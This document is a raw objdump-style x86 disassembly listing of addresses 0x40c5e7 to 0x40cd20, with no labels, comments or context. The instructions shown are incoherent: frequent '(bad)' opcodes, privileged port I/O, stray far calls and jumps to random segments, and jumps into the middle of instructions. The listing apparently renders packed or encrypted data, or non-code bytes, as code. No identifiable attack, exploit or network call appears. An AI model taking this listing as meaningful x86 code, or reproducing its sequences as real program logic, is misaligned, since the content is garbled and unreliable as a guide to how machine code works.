  40c5e7:	or     al,0x88
  40c5e9:	jmp    0x40c5da
  40c5eb:	out    dx,eax
  40c5ec:	stos   DWORD PTR es:[edi],eax
  40c5ed:	call   FWORD PTR gs:[ebx+0xf2ae593]
  40c5f4:	dec    esi
  40c5f5:	mov    ebx,0x86c29e46
  40c5fa:	jecxz  0x40c65c
  40c5fc:	repnz (bad) [ebx]
  40c5ff:	or     eax,0x20779078
  40c604:	push   ss
  40c605:	dec    ebp
  40c606:	sbb    esi,DWORD PTR [esi+0x60]
  40c609:	jne    0x40c5e5
  40c60b:	outs   dx,DWORD PTR ds:[esi]
  40c60c:	pop    ds
  40c60d:	mov    eax,ds:0xea6414c8
  40c612:	jns    0x40c661
  40c614:	hlt    
  40c615:	sub    eax,DWORD PTR [edi-0xcca6eaa]
  40c61b:	mov    al,ds:0xd53972fc
  40c620:	mov    ebx,es
  40c622:	in     eax,dx
  40c623:	xchg   ebp,eax
  40c624:	int    0x6d
  40c626:	jb     0x40c65b
  40c628:	push   edi
  40c629:	das    
  40c62a:	jne    0x40c632
  40c62c:	rol    BYTE PTR [ebp-0x5d],cl
  40c62f:	(bad)  
  40c631:	imul   eax,eax,0x72
  40c634:	pop    ebp
  40c635:	mov    bh,0x7e
  40c637:	mov    dl,0x86
  40c639:	shl    BYTE PTR [edi+0x2e],1
  40c63c:	or     edi,DWORD PTR ds:0x56d03788
  40c642:	add    eax,DWORD PTR [edi-0x1327b210]
  40c648:	in     al,dx
  40c649:	push   edi
  40c64a:	or     al,0x96
  40c64c:	fwait
  40c64d:	pop    edi
  40c64e:	xor    al,BYTE PTR [esi]
  40c650:	stc    
  40c651:	and    eax,0x13fbe851
  40c656:	and    cl,dl
  40c658:	mov    al,0xe
  40c65a:	mov    al,ds:0xffdfee5b
  40c65f:	dec    esi
  40c660:	ds retf 
  40c662:	and    DWORD PTR [edx-0x933bc74],esp
  40c668:	sbb    DWORD PTR [edi],0xffffffbc
  40c66b:	mov    cl,0xaf
  40c66d:	xchg   ebx,eax
  40c66e:	nop
  40c66f:	adc    eax,0x64802c8a
  40c674:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c675:	(bad)  
  40c676:	in     al,0xc0
  40c678:	mov    dh,0x6b
  40c67a:	(bad)  
  40c67b:	cs imul edi,ebp,0x5a
  40c67f:	mov    bh,0x4b
  40c681:	fdivr  QWORD PTR [esi]
  40c683:	jmp    0x40c629
  40c685:	bnd js 0x40c6f9
  40c688:	daa    
  40c689:	add    DWORD PTR es:[eax+edx*2-0x56],ebx
  40c68e:	aad    0xc
  40c690:	cld    
  40c691:	(bad)  
  40c692:	jg     0x40c6ec
  40c694:	jg     0x40c65c
  40c696:	shl    DWORD PTR [eax-0x4a],cl
  40c699:	rcr    DWORD PTR [ecx],1
  40c69b:	mov    eax,ds:0x4918e35e
  40c6a0:	stc    
  40c6a1:	jge    0x40c6f6
  40c6a3:	mov    edi,0xfa6521e8
  40c6a8:	sahf   
  40c6a9:	call   0x839f:0x191aa13a
  40c6b0:	hlt    
  40c6b1:	sbb    al,dh
  40c6b3:	xchg   edx,eax
  40c6b4:	pushf  
  40c6b5:	pop    ecx
  40c6b6:	ins    BYTE PTR es:[edi],dx
  40c6b7:	pop    DWORD PTR [edi+edi*1+0x7c]
  40c6bb:	and    bl,ah
  40c6bd:	jl     0x40c669
  40c6bf:	adc    esp,esi
  40c6c1:	jo     0x40c70e
  40c6c3:	push   cs
  40c6c4:	ins    DWORD PTR es:[edi],dx
  40c6c5:	leave  
  40c6c6:	inc    edi
  40c6c7:	nop
  40c6c8:	scas   eax,DWORD PTR es:[edi]
  40c6c9:	and    esi,edi
  40c6cb:	cmp    esp,DWORD PTR [eax+0x4e2f614f]
  40c6d1:	ins    DWORD PTR es:[edi],dx
  40c6d2:	xlat   BYTE PTR ds:[ebx]
  40c6d3:	sar    BYTE PTR [ebx+0x65f56380],0xc9
  40c6da:	adc    BYTE PTR [eax-0x3296228b],bl
  40c6e0:	daa    
  40c6e1:	cmp    ecx,DWORD PTR [ecx-0x52]
  40c6e4:	hlt    
  40c6e5:	push   0x22
  40c6e7:	loopne 0x40c71c
  40c6e9:	loopne 0x40c70d
  40c6eb:	mov    edi,0xeee9946e
  40c6f0:	test   esi,0x8dcebef9
  40c6f6:	adc    eax,0x9422b666
  40c6fb:	inc    esi
  40c6fc:	cmp    BYTE PTR [edi-0x12],0xe6
  40c700:	test   DWORD PTR [edx+0x9631dd8],ebx
  40c706:	mov    WORD PTR [edi],gs
  40c708:	icebp  
  40c709:	inc    edx
  40c70a:	fwait
  40c70b:	or     DWORD PTR [esi+0x5060abd7],esi
  40c711:	xor    bh,cl
  40c713:	xchg   edx,eax
  40c714:	ins    DWORD PTR es:[edi],dx
  40c715:	shr    esi,cl
  40c717:	xchg   edi,eax
  40c718:	cld    
  40c719:	push   eax
  40c71a:	mov    ds:0x2a7fc82a,al
  40c71f:	sub    al,0xb0
  40c721:	jmp    0x6f02:0x9541bca0
  40c728:	cmc    
  40c729:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c72a:	in     al,dx
  40c72b:	xor    bh,BYTE PTR [ebp-0x7629596d]
  40c731:	xor    dh,0x3f
  40c734:	mov    fs,edx
  40c736:	mov    ch,0xa3
  40c738:	out    0x4e,eax
  40c73a:	push   0xfb1b1387
  40c73f:	sti    
  40c740:	inc    esi
  40c741:	lahf   
  40c742:	into   
  40c743:	jae    0x40c75b
  40c745:	and    DWORD PTR [esi+ecx*1],ebx
  40c748:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c749:	pop    ebp
  40c74a:	fistp  WORD PTR [edx+edi*1-0x445add71]
  40c751:	fld    QWORD PTR [ebp-0x2a15b257]
  40c757:	rcl    DWORD PTR [edx],cl
  40c759:	add    BYTE PTR [ebx+ebp*2+0x19e1585],al
  40c760:	imul   ebp,DWORD PTR [eax-0x30],0x78
  40c764:	lea    ebx,ds:0xa98a22c8
  40c76a:	stos   DWORD PTR es:[edi],eax
  40c76b:	fwait
  40c76c:	inc    edi
  40c76d:	add    DWORD PTR ds:0x7d92438a,eax
  40c773:	test   eax,0x2e37740f
  40c778:	add    ebx,DWORD PTR [ebx+ebp*2]
  40c77b:	jbe    0x40c79c
  40c77d:	cmp    DWORD PTR [eax-0xffafc7c],edx
  40c783:	les    esi,FWORD PTR [ebp+0x45eea164]
  40c789:	or     ecx,edx
  40c78b:	mov    ebp,ebp
  40c78d:	push   ebp
  40c78e:	push   ds
  40c78f:	push   0xffffffcb
  40c791:	fild   QWORD PTR [edi+0x4e]
  40c794:	mov    bh,0xd7
  40c796:	mov    esi,0xadb91c59
  40c79b:	sar    DWORD PTR [ecx-0x37],cl
  40c79e:	dec    ebx
  40c79f:	pop    esi
  40c7a0:	dec    eax
  40c7a1:	adc    BYTE PTR [esi-0x6574d4e8],dl
  40c7a7:	inc    ecx
  40c7a8:	add    eax,esi
  40c7aa:	int3   
  40c7ab:	xchg   DWORD PTR [eax+0x54743f91],ebp
  40c7b1:	mov    cs,WORD PTR [esi-0x59]
  40c7b4:	das    
  40c7b5:	lods   al,BYTE PTR ds:[esi]
  40c7b6:	clc    
  40c7b7:	or     BYTE PTR [eax-0x1b],ch
  40c7ba:	ficomp DWORD PTR [ebx+ecx*4-0x263f07a6]
  40c7c1:	push   ebp
  40c7c2:	push   cs
  40c7c3:	fs dec ebp
  40c7c5:	or     al,0xa2
  40c7c7:	pop    edx
  40c7c8:	jmp    0x422a:0xeb61caf4
  40c7cf:	jg     0x40c7bd
  40c7d1:	pop    ds
  40c7d2:	dec    DWORD PTR [edi-0x4f]
  40c7d5:	lock ret 
  40c7d7:	jbe    0x40c7b8
  40c7d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c7da:	faddp  st(3),st
  40c7dc:	push   es
  40c7dd:	out    dx,al
  40c7de:	leave  
  40c7df:	sbb    BYTE PTR ds:0xc981ba2f,ch
  40c7e5:	pop    ecx
  40c7e6:	push   0x24
  40c7e8:	mov    dl,0x3d
  40c7ea:	(bad)  
  40c7ec:	add    BYTE PTR [esi],al
  40c7ee:	adc    ecx,ebx
  40c7f0:	test   DWORD PTR [edx],0xe64dabab
  40c7f6:	fistp  QWORD PTR es:[ebp+0x2ce4ce44]
  40c7fd:	and    edi,edx
  40c7ff:	and    DWORD PTR [ecx],edi
  40c801:	neg    eax
  40c803:	leave  
  40c804:	sub    DWORD PTR [esi],esi
  40c806:	adc    al,0xcd
  40c808:	not    BYTE PTR [ecx+0x6361987]
  40c80e:	add    al,BYTE PTR [edx+0xc]
  40c811:	inc    edi
  40c812:	mov    DWORD PTR [ecx+0x1e0f6d7f],ecx
  40c818:	adc    bl,BYTE PTR [esi+0x1f]
  40c81b:	inc    esi
  40c81c:	mov    edi,0x5ecc8dde
  40c821:	mov    dh,0xd5
  40c823:	mov    BYTE PTR [ebx],cl
  40c825:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c826:	lods   al,BYTE PTR ds:[esi]
  40c827:	xor    ecx,DWORD PTR [edi-0x5ee19168]
  40c82d:	xor    ecx,edx
  40c82f:	dec    esi
  40c830:	(bad)  
  40c832:	push   edx
  40c833:	pop    edi
  40c834:	xor    DWORD PTR [edi+0x51],ebp
  40c837:	cs stos BYTE PTR es:[edi],al
  40c839:	je     0x40c83f
  40c83b:	or     al,0xaf
  40c83d:	adc    DWORD PTR [ebx-0x16],ebp
  40c840:	fadd   DWORD PTR [ebx+0x68c40433]
  40c846:	mov    bh,0xfe
  40c848:	mov    BYTE PTR [ebx],0x18
  40c84b:	mov    esp,0xae86d4b9
  40c850:	lods   eax,DWORD PTR ds:[esi]
  40c851:	mov    eax,0x4673869
  40c856:	xabort 0x55
  40c859:	cmp    eax,0xa5b1be3d
  40c85e:	sti    
  40c85f:	xor    eax,0x9b978577
  40c864:	add    BYTE PTR [esi-0x2c],0x24
  40c868:	stos   BYTE PTR es:[edi],al
  40c869:	inc    esp
  40c86a:	rcl    BYTE PTR [esi+0x11],0x4c
  40c86e:	lds    ecx,FWORD PTR [ecx+0x7c950d0d]
  40c874:	icebp  
  40c875:	pop    esp
  40c876:	lods   al,BYTE PTR ds:[esi]
  40c877:	cmp    cl,0x2e
  40c87a:	bound  eax,QWORD PTR [edi-0x4c]
  40c87d:	sbb    eax,0xb5c5ec29
  40c882:	aaa    
  40c883:	retf   0xe5b2
  40c886:	sbb    al,0x7
  40c888:	imul   edi,DWORD PTR [ebp-0x7c],0x57
  40c88c:	pop    edx
  40c88d:	inc    ecx
  40c88e:	or     al,0x12
  40c890:	push   eax
  40c891:	cmp    al,0x16
  40c893:	push   ds
  40c894:	push   esp
  40c895:	adc    al,0x4
  40c897:	fs aaa 
  40c899:	and    edx,DWORD PTR [esi]
  40c89b:	add    al,0xbd
  40c89d:	aam    0x27
  40c89f:	fisub  WORD PTR [edi]
  40c8a1:	jnp    0x40c874
  40c8a3:	js     0x40c903
  40c8a5:	push   es
  40c8a6:	popa   
  40c8a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c8a8:	nop
  40c8a9:	jae    0x40c87a
  40c8ab:	pop    ebp
  40c8ac:	push   ss
  40c8ad:	push   ss
  40c8ae:	retf   0xc6fb
  40c8b1:	lea    ebx,[esp+eax*1-0x2d]
  40c8b5:	frstor [edx+0x77f97124]
  40c8bb:	rol    BYTE PTR ds:[eax-0x3e32bc6b],cl
  40c8c2:	fidivr WORD PTR [ebp-0xd601829]
  40c8c8:	dec    eax
  40c8c9:	inc    ebp
  40c8ca:	push   0xfd3d6a54
  40c8cf:	(bad)  
  40c8d0:	lock icebp 
  40c8d2:	add    DWORD PTR [edi],ecx
  40c8d4:	repz jo 0x40c8e2
  40c8d7:	push   edx
  40c8d8:	adc    eax,DWORD PTR [esi+edi*2]
  40c8db:	and    esi,ebx
  40c8dd:	(bad)  [ecx-0x700f6359]
  40c8e3:	inc    edx
  40c8e4:	push   edx
  40c8e5:	xor    eax,0xa71b2fbb
  40c8ea:	inc    ecx
  40c8eb:	sbb    dl,BYTE PTR [ebx+ebp*8+0x29]
  40c8ef:	mov    cl,0x36
  40c8f1:	ins    BYTE PTR es:[edi],dx
  40c8f2:	jbe    0x40c90d
  40c8f4:	shr    ecx,0x16
  40c8f7:	cld    
  40c8f8:	xor    DWORD PTR [eax+0x48],ebx
  40c8fb:	fwait
  40c8fc:	push   edi
  40c8fd:	(bad)  
  40c8fe:	(bad)  
  40c8ff:	sub    dl,BYTE PTR ss:[eax+0x71]
  40c903:	int    0xd
  40c905:	pop    ebx
  40c906:	xchg   ebp,eax
  40c907:	rcl    BYTE PTR [ebx],1
  40c909:	xor    dh,bl
  40c90b:	xor    al,0x1
  40c90d:	in     al,dx
  40c90e:	retf   
  40c90f:	rcr    DWORD PTR [ebx],0x73
  40c912:	(bad)  
  40c913:	stc    
  40c914:	mov    cl,BYTE PTR ds:0x44efcd65
  40c91a:	dec    esi
  40c91b:	xchg   DWORD PTR [edx+0x69fbfb57],edx
  40c921:	shr    BYTE PTR [edi+0x420d5e44],cl
  40c927:	push   ss
  40c928:	dec    esi
  40c929:	pop    esp
  40c92a:	cwde   
  40c92b:	test   BYTE PTR [ecx-0x5ce2b539],0x87
  40c932:	test   dh,bl
  40c934:	jns    0x40c97a
  40c936:	add    eax,0xdce47d4e
  40c93b:	pop    ebp
  40c93c:	call   FWORD PTR [ecx-0x27b4dbb7]
  40c942:	aas    
  40c943:	ja     0x40c935
  40c945:	and    esi,esi
  40c947:	popw   ss
  40c949:	stos   DWORD PTR es:[edi],eax
  40c94a:	ins    DWORD PTR es:[edi],dx
  40c94b:	push   0xffffffe9
  40c94d:	inc    esp
  40c94e:	arpl   WORD PTR [ebx-0x13],ax
  40c951:	pop    ds
  40c952:	dec    eax
  40c953:	xchg   esi,eax
  40c954:	push   0xffffffa4
  40c956:	jmp    0xcc1b3d07
  40c95b:	xor    al,0x67
  40c95d:	jb     0x40c9d3
  40c95f:	jle    0x40c9cf
  40c961:	jnp    0x40c95b
  40c963:	ins    DWORD PTR es:[edi],dx
  40c964:	lahf   
  40c965:	scas   al,BYTE PTR es:[edi]
  40c966:	push   esi
  40c967:	sar    DWORD PTR ds:0x65357ce2,0x18
  40c96e:	lds    ecx,FWORD PTR ds:[ebx]
  40c971:	lea    eax,[ecx]
  40c973:	push   ebp
  40c974:	push   eax
  40c975:	sar    BYTE PTR [ecx-0x2842a35b],cl
  40c97b:	(bad)  [edi-0x46]
  40c97e:	imul   edi,ebp,0x12
  40c981:	lea    ebx,[eax+0x4c]
  40c984:	sbb    eax,0xdddbc41e
  40c989:	jb     0x40c9be
  40c98b:	retf   0x5897
  40c98e:	call   DWORD PTR [ebp+0x50f76855]
  40c994:	pop    ss
  40c995:	scas   eax,DWORD PTR es:[edi]
  40c996:	jle    0x40c973
  40c998:	cli    
  40c999:	sbb    dh,BYTE PTR [esi-0x17]
  40c99c:	rcr    BYTE PTR [eax+ebp*1-0x2],0x7c
  40c9a1:	or     BYTE PTR [esi],0x63
  40c9a4:	add    DWORD PTR [ebx],esi
  40c9a6:	data16 and ah,BYTE PTR [ebx+0xa53dfa7]
  40c9ad:	int3   
  40c9ae:	cmp    al,0x22
  40c9b0:	mov    ah,0x9f
  40c9b2:	push   ecx
  40c9b3:	addr16 push esp
  40c9b5:	repnz inc esp
  40c9b7:	hlt    
  40c9b8:	ror    DWORD PTR [eax],1
  40c9ba:	gs gs jl 0x40c9e0
  40c9be:	adc    BYTE PTR [ebx+0x58e4af98],cl
  40c9c4:	mov    bh,0xd7
  40c9c6:	dec    ecx
  40c9c7:	mov    BYTE PTR [eax+0x9],dl
  40c9ca:	and    dh,BYTE PTR [ebp-0x60ad3f39]
  40c9d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c9d1:	lea    ebp,[eax-0x77]
  40c9d4:	push   0x7a
  40c9d6:	add    eax,0x469c4bc3
  40c9db:	js     0x40c9d7
  40c9dd:	leave  
  40c9de:	lds    ebx,FWORD PTR [ebx+0x5d5d1c]
  40c9e4:	je     0x40c9c8
  40c9e6:	mov    eax,0xb7c977e9
  40c9eb:	sahf   
  40c9ec:	add    al,bh
  40c9ee:	(bad)  
  40c9ef:	mov    dl,0x69
  40c9f1:	jno    0x40ca16
  40c9f3:	pop    ecx
  40c9f4:	adc    al,BYTE PTR [edx+0x59]
  40c9f7:	cmp    dh,cl
  40c9f9:	imul   esp,DWORD PTR [ecx-0x1f556674],0x47
  40ca00:	mov    ds:0x8e8fa145,eax
  40ca05:	jb     0x40ca7f
  40ca07:	lahf   
  40ca08:	(bad)  
  40ca09:	adc    bh,BYTE PTR [ebx-0x5f]
  40ca0c:	in     eax,dx
  40ca0d:	inc    eax
  40ca0e:	push   ss
  40ca0f:	push   edi
  40ca10:	xchg   esi,eax
  40ca11:	rol    DWORD PTR [ebp-0x4c45de79],0x78
  40ca18:	jmp    0x75ac528a
  40ca1d:	push   0x23
  40ca1f:	fbstp  TBYTE PTR [edx]
  40ca21:	adc    BYTE PTR [edi+0x2f2e19ab],bh
  40ca27:	jecxz  0x40c9c9
  40ca29:	test   BYTE PTR [edi-0x66f0cc9d],0x50
  40ca30:	dec    esi
  40ca31:	clc    
  40ca32:	(bad)  
  40ca33:	fldcw  WORD PTR [eax-0x7b]
  40ca36:	pop    edx
  40ca37:	cmp    BYTE PTR [ecx-0xbdd7555],cl
  40ca3d:	mov    ah,BYTE PTR [edx-0x3b]
  40ca40:	push   0x11
  40ca42:	xor    bh,dh
  40ca44:	and    dl,dl
  40ca46:	test   eax,0x577b6c88
  40ca4b:	fdivr  DWORD PTR [ecx]
  40ca4d:	mov    esp,0xad1d28d1
  40ca52:	pusha  
  40ca53:	lods   eax,DWORD PTR ds:[esi]
  40ca54:	fstp   QWORD PTR [ecx-0x1f]
  40ca57:	adc    al,0xd4
  40ca59:	in     eax,0xb1
  40ca5b:	std    
  40ca5c:	and    dl,ch
  40ca5e:	hlt    
  40ca5f:	rol    DWORD PTR [edx-0x1d],cl
  40ca62:	das    
  40ca63:	test   DWORD PTR [esi],esi
  40ca65:	mov    eax,ds:0xac704207
  40ca6a:	push   eax
  40ca6b:	daa    
  40ca6c:	add    al,0x80
  40ca6e:	and    al,0x3e
  40ca70:	or     ah,ah
  40ca72:	icebp  
  40ca73:	and    DWORD PTR [ecx],0xd0e1605f
  40ca79:	fwait
  40ca7a:	sub    al,0x4c
  40ca7c:	lahf   
  40ca7d:	sbb    al,al
  40ca7f:	jnp    0x40cade
  40ca81:	mov    eax,0x6ccabf77
  40ca86:	stos   BYTE PTR es:[edi],al
  40ca87:	ret    
  40ca88:	not    bl
  40ca8a:	push   edx
  40ca8b:	ins    BYTE PTR es:[edi],dx
  40ca8c:	imul   ebx,DWORD PTR [ebx],0x7ff159e5
  40ca92:	add    al,0xc2
  40ca94:	loope  0x40ca1c
  40ca96:	mov    BYTE PTR [ecx],dl
  40ca98:	ret    
  40ca99:	dec    ebx
  40ca9a:	mov    esp,0x4959f69b
  40ca9f:	xlat   BYTE PTR ds:[ebx]
  40caa0:	test   bl,0x46
  40caa3:	pop    edx
  40caa4:	jg     0x40cb0f
  40caa6:	mov    ebx,DWORD PTR [esp+edx*2-0x13df8dad]
  40caad:	popa   
  40caae:	sub    ebx,DWORD PTR [esi+0x42]
  40cab1:	mov    ebx,0x7fb699e8
  40cab6:	cmp    esp,edx
  40cab8:	in     eax,0x25
  40caba:	sbb    eax,0x5620f2f3
  40cabf:	shr    BYTE PTR [ecx],cl
  40cac1:	js     0x40ca5f
  40cac3:	es pop esp
  40cac5:	stc    
  40cac6:	clc    
  40cac7:	add    ah,BYTE PTR [ebx]
  40cac9:	cmp    eax,0x7568278
  40cace:	add    bh,BYTE PTR [ecx-0x11]
  40cad1:	mov    WORD PTR [eax],cs
  40cad3:	test   BYTE PTR [ecx+0x5a],cl
  40cad6:	test   al,0x64
  40cad8:	data16 jecxz 0x40caa2
  40cadb:	fwait
  40cadc:	mov    eax,ds:0x8af5a49f
  40cae1:	xor    bl,BYTE PTR [edx-0x2c1500ec]
  40cae7:	xchg   ecx,eax
  40cae8:	push   ebp
  40cae9:	xor    al,0x81
  40caeb:	mov    ebx,0x324d3550
  40caf0:	loop   0x40cb40
  40caf2:	loope  0x40ca82
  40caf4:	lahf   
  40caf5:	jnp    0x40ca78
  40caf7:	and    DWORD PTR [esi+0x77],0x4e
  40cafb:	lds    ecx,FWORD PTR [ecx]
  40cafd:	std    
  40cafe:	jp     0x40cb7c
  40cb00:	mov    ebp,0xc20cd312
  40cb05:	or     ch,dl
  40cb07:	sahf   
  40cb08:	outs   dx,BYTE PTR ds:[esi]
  40cb09:	dec    edi
  40cb0a:	(bad)  
  40cb0b:	cli    
  40cb0c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cb0d:	sbb    esi,esp
  40cb0f:	mov    dh,0x4b
  40cb11:	or     ah,BYTE PTR [esi]
  40cb13:	enter  0x85f4,0x32
  40cb17:	jmp    0x46a5cc43
  40cb1c:	jns    0x40cb22
  40cb1e:	or     BYTE PTR [edx],ch
  40cb20:	lods   al,BYTE PTR ds:[esi]
  40cb21:	or     al,0x4c
  40cb23:	das    
  40cb24:	ins    DWORD PTR es:[edi],dx
  40cb25:	adc    eax,0x135240ea
  40cb2a:	daa    
  40cb2b:	fucomi st,st(0)
  40cb2d:	pusha  
  40cb2e:	push   eax
  40cb2f:	sti    
  40cb30:	inc    esp
  40cb31:	int    0xe6
  40cb33:	push   0x89da3ade
  40cb38:	add    BYTE PTR [eax+0x66afb596],0xc6
  40cb3f:	cdq    
  40cb40:	mov    eax,ds:0x3919f616
  40cb45:	lds    ebp,FWORD PTR [edx]
  40cb47:	xchg   DWORD PTR [edx+0x50],edx
  40cb4a:	mov    al,ds:0x558a3a55
  40cb4f:	pop    ecx
  40cb50:	xchg   ecx,eax
  40cb51:	add    ch,BYTE PTR [eax+0x1588ce85]
  40cb57:	xchg   DWORD PTR [ebp-0x2a15c816],eax
  40cb5d:	push   ecx
  40cb5e:	jp     0x40cb19
  40cb60:	leave  
  40cb61:	das    
  40cb62:	mov    ecx,0x657baf1c
  40cb67:	repz test DWORD PTR [edi],esp
  40cb6a:	loop   0x40cbe2
  40cb6c:	call   0x5f0864c9
  40cb71:	shufps xmm4,xmm4,0xd4
  40cb75:	and    eax,0x9b31639d
  40cb7a:	aaa    
  40cb7b:	adc    esp,DWORD PTR [esp+ebx*8]
  40cb7e:	sbb    eax,0xdb4b5c4b
  40cb83:	int3   
  40cb84:	fimul  DWORD PTR [ecx]
  40cb86:	push   ss
  40cb87:	inc    eax
  40cb88:	push   eax
  40cb89:	jnp    0x40cb8d
  40cb8b:	lods   al,BYTE PTR ds:[esi]
  40cb8c:	sub    al,0xfe
  40cb8e:	push   cs
  40cb8f:	xchg   BYTE PTR [ecx+0x3f2ee61b],bl
  40cb95:	jns    0x40cb26
  40cb97:	mov    cl,0x87
  40cb99:	cmp    BYTE PTR [edx-0x4a],al
  40cb9c:	or     ecx,DWORD PTR [edx]
  40cb9e:	sbb    al,0xd
  40cba0:	mov    edi,DWORD PTR [ecx+0x78]
  40cba3:	xchg   ecx,eax
  40cba4:	(bad)  
  40cba5:	adc    eax,eax
  40cba7:	jge    0x40cb79
  40cba9:	push   cs
  40cbaa:	fistp  WORD PTR [ebx-0x45]
  40cbad:	inc    eax
  40cbae:	cmp    BYTE PTR [eax+ecx*1],bl
  40cbb1:	add    ecx,edi
  40cbb3:	in     al,0xdf
  40cbb5:	rol    BYTE PTR [eax],cl
  40cbb7:	sub    ebx,DWORD PTR [esp+ecx*8-0x5b]
  40cbbb:	cld    
  40cbbc:	push   edx
  40cbbd:	and    eax,0x5eb39f47
  40cbc2:	mov    al,BYTE PTR [edi]
  40cbc4:	stc    
  40cbc5:	jecxz  0x40cc13
  40cbc7:	inc    esi
  40cbc8:	psrld  mm7,QWORD PTR [ebx+0x2a]
  40cbcc:	jnp    0x40cb63
  40cbce:	xor    al,0xe3
  40cbd0:	push   ss
  40cbd1:	or     al,0x92
  40cbd3:	push   edx
  40cbd4:	sbb    dl,0xd
  40cbd7:	arpl   WORD PTR [ebx+0x14],cx
  40cbda:	(bad)  
  40cbdb:	(bad)  
  40cbdc:	loop   0x40cc33
  40cbde:	pop    ebp
  40cbdf:	daa    
  40cbe0:	sbb    eax,0x4d5d1c52
  40cbe5:	jp     0x40cbd7
  40cbe7:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  40cbe9:	cmp    ebx,edi
  40cbeb:	ror    BYTE PTR [eax-0xc],cl
  40cbee:	ja     0x40cbb1
  40cbf0:	scas   al,BYTE PTR es:[edi]
  40cbf1:	sub    bl,dh
  40cbf3:	icebp  
  40cbf4:	mov    bh,0x54
  40cbf6:	(bad)  
  40cbf7:	out    0xd8,eax
  40cbf9:	jo     0x40cc17
  40cbfb:	fneni(8087 only) 
  40cbfd:	push   eax
  40cbfe:	mov    ch,0x1b
  40cc00:	push   ecx
  40cc01:	icebp  
  40cc02:	add    BYTE PTR [ebx+0x6f89a16b],ah
  40cc08:	mov    eax,ds:0x3d73e1e8
  40cc0d:	call   0x1c87:0xa8ad8eff
  40cc14:	pop    ebx
  40cc15:	sahf   
  40cc16:	xchg   edi,eax
  40cc17:	sub    DWORD PTR [ebx],0x8386c7d
  40cc1d:	mov    esi,0x8a7774ed
  40cc22:	sbb    BYTE PTR [edi],bh
  40cc24:	sbb    bh,BYTE PTR [esi-0x5c]
  40cc27:	jnp    0x40cbf5
  40cc29:	loope  0x40cc29
  40cc2b:	jmp    0x8a88:0xcfc6ccb8
  40cc32:	rcl    ebp,0x6c
  40cc35:	mov    ebx,DWORD PTR [esp+esi*2+0x5aef0f1e]
  40cc3c:	xchg   esi,eax
  40cc3d:	inc    ebx
  40cc3e:	call   0xd9fd:0x10824c4c
  40cc45:	pushf  
  40cc46:	mov    edx,ebp
  40cc48:	dec    edx
  40cc49:	aaa    
  40cc4a:	xchg   edx,eax
  40cc4b:	push   eax
  40cc4c:	pop    esp
  40cc4d:	push   esp
  40cc4e:	je     0x40cc4e
  40cc50:	test   BYTE PTR [ecx-0x5b77c73e],ah
  40cc56:	dec    ebx
  40cc57:	ja     0x40cc0f
  40cc59:	test   DWORD PTR [esi+0xbe6826],ebx
  40cc5f:	xor    al,0xfa
  40cc61:	fsub   st,st(5)
  40cc63:	mov    edi,0xa12fe36
  40cc68:	out    0xec,eax
  40cc6a:	(bad)  [ebp+esi*1+0x44]
  40cc6e:	mov    ecx,0x4f0bd2dd
  40cc73:	test   eax,0x69bf9d57
  40cc78:	add    BYTE PTR [eax+edi*2],bh
  40cc7b:	dec    ecx
  40cc7c:	ror    BYTE PTR [eax],cl
  40cc7e:	sub    edx,ecx
  40cc80:	outs   dx,BYTE PTR ds:[esi]
  40cc81:	mov    dh,0x4d
  40cc83:	jno    0x40ccef
  40cc85:	cwde   
  40cc86:	and    DWORD PTR [ebp-0x3f],ecx
  40cc89:	nop
  40cc8a:	dec    eax
  40cc8b:	mov    WORD PTR [ebx+0xd03d723],?
  40cc91:	xchg   esp,eax
  40cc92:	(bad)  
  40cc93:	mov    dl,0x41
  40cc95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cc96:	dec    edi
  40cc97:	xchg   esp,eax
  40cc98:	stos   DWORD PTR es:[edi],eax
  40cc99:	add    ah,bl
  40cc9b:	mov    al,0x2f
  40cc9d:	fist   WORD PTR [eax-0x60]
  40cca0:	xor    al,ch
  40cca2:	pop    es
  40cca3:	pop    DWORD PTR [edx+0x65]
  40cca6:	std    
  40cca7:	push   es
  40cca8:	imul   esp,edi,0x2ea33051
  40ccae:	jne    0x40cc4c
  40ccb0:	cmovg  esp,DWORD PTR [ecx-0x78]
  40ccb4:	jle    0x40ccff
  40ccb6:	xor    al,0xe
  40ccb8:	pop    edx
  40ccb9:	adc    al,0x32
  40ccbb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ccbc:	pop    ds
  40ccbd:	loop   0x40ccad
  40ccbf:	lahf   
  40ccc0:	sbb    al,0x49
  40ccc2:	pop    edi
  40ccc3:	dec    ebx
  40ccc4:	jge    0x40cd02
  40ccc6:	mov    al,0x28
  40ccc8:	push   cs
  40ccc9:	retf   0x873e
  40cccc:	gs pop esp
  40ccce:	ret    
  40cccf:	dec    ebx
  40ccd0:	ror    DWORD PTR [esi],0x5d
  40ccd3:	loope  0x40ccd4
  40ccd5:	jmp    0x40cd08
  40ccd7:	fcmovnu st,st(1)
  40ccd9:	mov    bl,0x97
  40ccdb:	jmp    0x10966192
  40cce0:	(bad)  
  40cce1:	addr16 (bad) 
  40cce3:	mov    cl,BYTE PTR [edi-0x59]
  40cce6:	cmp    eax,0x24fc62a
  40cceb:	cli    
  40ccec:	stc    
  40cced:	xchg   edx,eax
  40ccee:	data16 ror BYTE PTR [edx-0x4373542b],0x75
  40ccf6:	inc    ecx
  40ccf7:	adc    al,BYTE PTR [esi-0x72]
  40ccfa:	sar    BYTE PTR [edx],0xa2
  40ccfd:	pop    es
  40ccfe:	inc    ebx
  40ccff:	jecxz  0x40cd66
  40cd01:	icebp  
  40cd02:	mov    ebx,0xdc4aeb86
  40cd07:	push   eax
  40cd08:	push   0xffffff85
  40cd0a:	rcl    BYTE PTR [edx+0x385ec0cc],cl
  40cd10:	in     eax,dx
  40cd11:	addr16 jb 0x40ccba
  40cd14:	xlat   BYTE PTR ds:[ebx]
  40cd15:	jmp    0x40cd18
  40cd17:	or     DWORD PTR [eax-0x4],edx
  40cd1a:	or     BYTE PTR ds:0x5c07b931,bl
  40cd20:	scas   al,BYTE PTR es:[edi]
